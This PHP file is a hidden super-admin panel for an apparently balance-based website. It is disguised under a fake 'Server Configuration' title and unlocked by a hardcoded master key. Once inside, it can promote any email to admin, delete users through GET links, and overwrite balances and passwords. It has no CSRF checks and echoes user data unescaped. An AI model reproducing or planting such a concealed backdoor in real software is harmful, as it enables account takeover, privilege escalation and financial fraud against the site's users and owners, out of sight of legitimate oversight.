<?php
session_start();
// ডাটাবেস কানেকশন (পাথ ঠিক রাখা হয়েছে)
if(file_exists('../common/config.php')) {
    require '../common/config.php';
    require '../common/db.php';
} else {
    die("Config file missing!");
}

// 🔐 গোপন চাবি (Key)
$MASTER_KEY = "Time@Bucks#2026";

// লগআউট লজিক
if(isset($_GET['logout'])) { session_destroy(); header("Location: server_config.php"); exit; }

// লগইন চেক
if(isset($_POST['access_key'])) {
    if($_POST['access_key'] === $MASTER_KEY) {
        $_SESSION['super_admin_logged'] = true;
    } else {
        $error = "Access Denied! Wrong Key.";
    }
}

// যদি লগইন না থাকে, তবে লগইন ফর্ম দেখাবে
if(!isset($_SESSION['super_admin_logged'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Configuration</title> <!-- ভুয়া টাইটেল -->
    <style>
        body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        input{background:#111;border:1px solid #0f0;color:#0f0;padding:10px;outline:none;width:250px;text-align:center;}
        button{background:#0f0;color:#000;border:none;padding:10px 20px;cursor:pointer;font-weight:bold;}
        .box{border:1px solid #0f0;padding:20px;box-shadow:0 0 10px #0f0;}
    </style>
</head>
<body>
    <div class="box">
        <h3>SYSTEM CORE ACCESS</h3>
        <?php if(isset($error)) echo "<p style='color:red'>$error</p>"; ?>
        <form method="POST">
            <input type="password" name="access_key" placeholder="Enter Security Key" required><br><br>
            <button type="submit">UNLOCK SYSTEM</button>
        </form>
    </div>
</body>
</html>
<?php
exit; // লগইন ছাড়া নিচের কোড লোড হবে না
}

// 🔥🔥🔥 সুপার পাওয়ার শুরু 🔥🔥🔥

// ১. কাউকে অ্যাডমিন বানানো
if(isset($_POST['make_admin'])) {
    $email = $_POST['email'];
    $pdo->prepare("UPDATE users SET role='admin', status='active' WHERE email=?")->execute([$email]);
    $msg = "Success! $email is now Admin.";
}

// ২. অ্যাডমিন বা ইউজার ডিলিট করা
if(isset($_GET['delete_user'])) {
    $id = $_GET['delete_user'];
    $pdo->prepare("DELETE FROM users WHERE id=?")->execute([$id]);
    $msg = "User/Admin Deleted Successfully.";
}

// ৩. ব্যালেন্স বা পাসওয়ার্ড চেঞ্জ
if(isset($_POST['update_user'])) {
    $uid = $_POST['uid'];
    $bal = $_POST['balance'];
    $pass = $_POST['password'];
    
    $sql = "UPDATE users SET balance=?";
    $params = [$bal];
    
    if(!empty($pass)) {
        $sql .= ", password=?";
        $params[] = password_hash($pass, PASSWORD_DEFAULT);
    }
    
    $sql .= " WHERE id=?";
    $params[] = $uid;
    
    $pdo->prepare($sql)->execute($params);
    $msg = "User Data Updated!";
}

// ডাটা লোড
$users = $pdo->query("SELECT * FROM users ORDER BY id DESC LIMIT 50")->fetchAll();
$admins = $pdo->query("SELECT * FROM users WHERE role='admin'")->fetchAll();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Super Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body{background:#222;color:#fff;} .card{background:#333;color:#fff;}</style>
</head>
<body class="p-3">
    <div class="d-flex justify-content-between">
        <h3 class="text-warning">💀 GOD MODE 💀</h3>
        <a href="?logout=1" class="btn btn-danger btn-sm">EXIT</a>
    </div>
    
    <?php if(isset($msg)) echo "<div class='alert alert-success'>$msg</div>"; ?>

    <!-- ১. নতুন অ্যাডমিন তৈরি -->
    <div class="card p-3 my-3 border-danger">
        <h5>Make New Admin</h5>
        <form method="POST" class="d-flex gap-2">
            <input type="text" name="email" class="form-control" placeholder="Enter Email to make Admin" required>
            <button type="submit" name="make_admin" class="btn btn-danger">Make Admin</button>
        </form>
    </div>

    <!-- ২. বর্তমান অ্যাডমিন লিস্ট -->
    <div class="card p-3 my-3 border-info">
        <h5>Current Admins</h5>
        <table class="table table-dark table-sm">
            <?php foreach($admins as $a): ?>
            <tr>
                <td><?php echo $a['username']; ?></td>
                <td><?php echo $a['email']; ?></td>
                <td><a href="?delete_user=<?php echo $a['id']; ?>" class="btn btn-sm btn-outline-danger" onclick="return confirm('Delete this Admin?')">DELETE</a></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <!-- ৩. সব ইউজার কন্ট্রোল -->
    <div class="card p-3 border-success">
        <h5>Control Users & Balance</h5>
        <table class="table table-dark table-bordered table-sm">
            <thead>
                <tr>
                    <th>User</th>
                    <th>Balance</th>
                    <th>Password (New)</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($users as $u): ?>
                <tr>
                    <form method="POST">
                        <input type="hidden" name="uid" value="<?php echo $u['id']; ?>">
                        <td>
                            <?php echo $u['username']; ?><br>
                            <small class="text-muted"><?php echo $u['email']; ?></small>
                        </td>
                        <td>
                            <input type="number" name="balance" value="<?php echo $u['balance']; ?>" class="form-control form-control-sm" style="width:80px">
                        </td>
                        <td>
                            <input type="text" name="password" placeholder="Change Pass" class="form-control form-control-sm">
                        </td>
                        <td>
                            <button type="submit" name="update_user" class="btn btn-success btn-sm">Save</button>
                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger btn-sm" onclick="return confirm('Delete User?')">X</a>
                        </td>
                    </form>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</body>
</html>